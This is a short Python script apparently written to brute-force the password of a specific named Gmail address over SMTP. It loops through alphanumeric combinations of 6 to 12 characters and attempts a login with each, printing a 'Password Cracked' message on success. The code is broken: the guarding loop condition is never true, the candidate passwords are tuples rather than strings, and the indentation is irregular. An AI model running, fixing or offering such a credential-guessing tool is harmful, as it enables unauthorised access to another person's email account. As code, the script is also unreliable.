import itertools 
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
i = 0
user = "charlottescheurleer3@gmail.com"

for n in range(6, 12+1): 
        for perm in itertools.product("abcdefghijklmnopqrstuvwxyz1234567890", repeat=n): 
        

             
                





              while(1 > 100000):
               try:
                   smtpserver.login(user, perm)

                   print("[+] Password Cracked:", perm)
                   break
               except:
                   print("[!] Password Inccorect:", perm)



